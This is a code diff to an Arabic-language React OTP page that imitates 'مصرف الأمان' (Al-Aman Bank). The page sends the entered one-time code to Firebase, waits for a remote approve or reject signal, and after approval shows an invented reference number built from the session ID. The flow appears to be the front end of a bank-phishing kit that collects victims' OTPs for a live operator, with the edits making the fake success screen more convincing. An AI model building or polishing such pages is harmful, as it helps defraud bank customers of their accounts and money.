@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "@/components/TransitionContext";
-import { saveOtp, listenForApproval, resetSession } from "@/lib/firebase";
+import { saveOtp, listenForApproval, resetSession, getSessionId } from "@/lib/firebase";
 
 const BLUE = "#1a3a7a";
 const BLUE2 = "#1e4db7";
@@ -42,6 +42,7 @@ export default function OtpPage() {
   const [pageState, setPageState] = useState<PageState>("form");
   const [error, setError] = useState("");
   const [submitted, setSubmitted] = useState(false);
+  const [refNumber, setRefNumber] = useState("");
   const unsubRef = useRef<(() => void) | null>(null);
 
   useEffect(() => {
@@ -78,9 +79,12 @@ export default function OtpPage() {
     unsubRef.current = listenForApproval((approved) => {
       if (approved === true) {
         unsubRef.current?.();
+        const sid = getSessionId();
+        const ref = "AMN-" + sid.slice(-8).toUpperCase();
+        setRefNumber(ref);
         setPageState("approved");
         resetSession();
-        setTimeout(() => navigateTo("/"), 2500);
+        setTimeout(() => navigateTo("/"), 5000);
       } else if (approved === false) {
         unsubRef.current?.();
         setPageState("rejected");
@@ -127,20 +131,37 @@ export default function OtpPage() {
   /* ── Approved ── */
   if (pageState === "approved") {
     return (
-      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#064e3b,#065f46,#059669)`, fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 32px" }}>
-        <div style={{ position: "relative", marginBottom: 28 }}>
-          {[0, 1].map(i => (
-            <div key={i} style={{ position: "absolute", inset: i * 12, borderRadius: "50%", border: `2px solid rgba(16,185,129,${0.4 - i * 0.2})`, animation: `ab-ring 2s ease-out infinite`, animationDelay: `${i * 0.5}s` }} />
+      <div dir="rtl" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: `linear-gradient(160deg,#064e3b,#065f46,#059669)`, fontFamily: "'Cairo',sans-serif", textAlign: "center", padding: "0 28px" }}>
+        {/* Rings */}
+        <div style={{ position: "relative", width: 110, height: 110, marginBottom: 32 }}>
+          {[0, 1, 2].map(i => (
+            <div key={i} style={{ position: "absolute", inset: i * 10, borderRadius: "50%", border: `2px solid rgba(255,255,255,${0.25 - i * 0.07})`, animation: `ab-ring 2.4s ease-out infinite`, animationDelay: `${i * 0.4}s` }} />
           ))}
-          <div className="ab-scale-in" style={{ width: 96, height: 96, borderRadius: "50%", background: "rgba(255,255,255,0.15)", border: "3px solid rgba(255,255,255,0.4)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 44, boxShadow: "0 8px 40px rgba(0,0,0,0.3)" }}>
+          <div className="ab-scale-in" style={{ position: "absolute", inset: 0, borderRadius: "50%", background: "rgba(255,255,255,0.18)", border: "3px solid rgba(255,255,255,0.5)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 46, boxShadow: "0 8px 40px rgba(0,0,0,0.3)" }}>
             ✅
           </div>
         </div>
-        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 24, fontWeight: 900, margin: "0 0 10px" }}>تم التحقق بنجاح!</h2>
-        <p style={{ color: "rgba(220,255,240,0.8)", fontSize: 14, lineHeight: 1.8 }}>مرحباً بك في مصرف الأمان<br />جارٍ تسجيل الدخول...</p>
-        <div style={{ display: "flex", gap: 8, marginTop: 20 }}>
-          {[0, 1, 2, 3].map(i => <div key={i} style={{ width: 8, height: 8, borderRadius: "50%", background: "rgba(255,255,255,0.7)", animation: `ab-dot 1.2s ease-in-out infinite`, animationDelay: `${i * 0.18}s` }} />)}
+
+        {/* Title */}
+        <h2 className="ab-slide-up" style={{ color: "white", fontSize: 26, fontWeight: 900, margin: "0 0 8px", letterSpacing: 0.5 }}>تم التسجيل بنجاح!</h2>
+        <p style={{ color: "rgba(220,255,240,0.85)", fontSize: 14, lineHeight: 1.9, margin: "0 0 32px" }}>
+          مرحباً بك في مصرف الأمان<br />تم تأكيد تسجيلك بنجاح
+        </p>
+
+        {/* Reference number card */}
+        <div style={{ background: "rgba(255,255,255,0.12)", border: "1.5px solid rgba(255,255,255,0.25)", borderRadius: 18, padding: "20px 32px", marginBottom: 28, backdropFilter: "blur(8px)", minWidth: 260 }}>
+          <p style={{ color: "rgba(220,255,240,0.7)", fontSize: 11, fontWeight: 700, margin: "0 0 8px", letterSpacing: 1, textTransform: "uppercase" }}>رقم المرجع</p>
+          <p style={{ color: "white", fontSize: 22, fontWeight: 900, fontFamily: "monospace", letterSpacing: 3, margin: 0 }}>{refNumber}</p>
+          <p style={{ color: "rgba(220,255,240,0.6)", fontSize: 10, margin: "8px 0 0" }}>يُرجى الاحتفاظ بهذا الرقم للمراجعة</p>
         </div>
+
+        {/* Loading dots */}
+        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
+          {[0, 1, 2, 3].map(i => (
+            <div key={i} style={{ width: 7, height: 7, borderRadius: "50%", background: "rgba(255,255,255,0.7)", animation: `ab-dot 1.2s ease-in-out infinite`, animationDelay: `${i * 0.18}s` }} />
+          ))}
+        </div>
+        <p style={{ color: "rgba(220,255,240,0.5)", fontSize: 11, marginTop: 10 }}>جارٍ إعادة التوجيه...</p>
       </div>
     );
   }
